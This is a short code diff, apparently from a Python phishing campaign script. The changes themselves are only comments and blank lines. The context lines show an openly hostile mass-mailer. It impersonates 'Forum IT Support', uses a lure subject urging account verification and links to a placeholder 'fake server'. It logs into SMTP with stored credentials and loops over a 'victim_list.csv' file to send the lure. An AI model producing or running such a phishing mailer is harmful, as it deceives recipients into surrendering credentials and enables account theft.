@@ -5,15 +5,18 @@ import json
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
+
 victims_info = "victim_list.csv"
 phishing_server = "http://localhost:5173/" # Change this to the actual fake server
 
+# Open the sender details
 with open("sender.json", "r") as file:
     data = json.load(file)
 
 sender_email = data["email"]
 app_password = data["password"]
 
+# Initiate an email server
 message = MIMEMultipart()
 message["From"] = "Forum IT Support <supportdesk@ticketservice.com>"
 message["Subject"] = "Urgent Action Required: Verfiy Your Account Now"
@@ -43,6 +46,7 @@ try:
     server.starttls()
     server.login(sender_email, app_password)
 
+    # Extract victims email list and send them the email above
     with open(victims_info, mode='r', newline="", encoding="utf-8") as file:
         reader = csv.reader(file)
 
